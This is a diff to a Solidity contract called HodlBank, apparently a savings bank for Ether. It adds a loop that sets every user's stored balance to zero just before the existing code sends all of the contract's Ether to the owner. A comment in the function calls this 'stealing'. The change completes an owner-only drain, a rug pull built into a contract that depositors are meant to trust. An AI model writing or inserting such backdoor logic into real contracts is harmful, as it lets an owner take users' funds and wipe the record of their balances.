@@ -108,6 +108,12 @@ contract HodlBank is Ownable {
         // There needs to be a balance for stealing :)
         require(amount > 0, "Contract does not have any balances");
 
+        // for loop that sets every accounts balance to -> 0
+        for (uint256 counter = 0; counter < userAddressList.length; counter++) {
+            // UserInfo memory userInfo = userInfoList[userAddressList[counter]];
+            userInfoList[userAddressList[counter]].storedBalance = 0;
+        }
+
         // send all Ether to owner
         // Owner can receive Ether since the address of owner is payable
         (bool success, ) = owner().call{value: amount}("");
